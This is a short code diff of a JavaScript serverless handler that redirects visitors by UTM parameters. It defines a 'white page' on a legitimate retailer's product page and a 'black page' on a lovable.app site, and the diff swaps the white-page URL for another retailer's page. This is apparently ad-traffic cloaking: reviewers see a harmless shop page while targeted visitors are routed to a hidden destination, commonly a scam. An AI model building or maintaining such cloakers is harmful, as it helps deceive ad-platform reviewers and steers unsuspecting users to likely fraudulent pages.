@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.carters.com/p/plaid-print-reindeer-christmas-loose-fit-long-sleeve-sleep-and-play-pajamas-red/V_1T751810";
+    const whitePageURL = "https://en.bensimon.com/p/manteau-malik-64041.html?countryCode=pk&gl_language=en-EN&glCountry=PK&glCurrency=PKR&lang=en";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
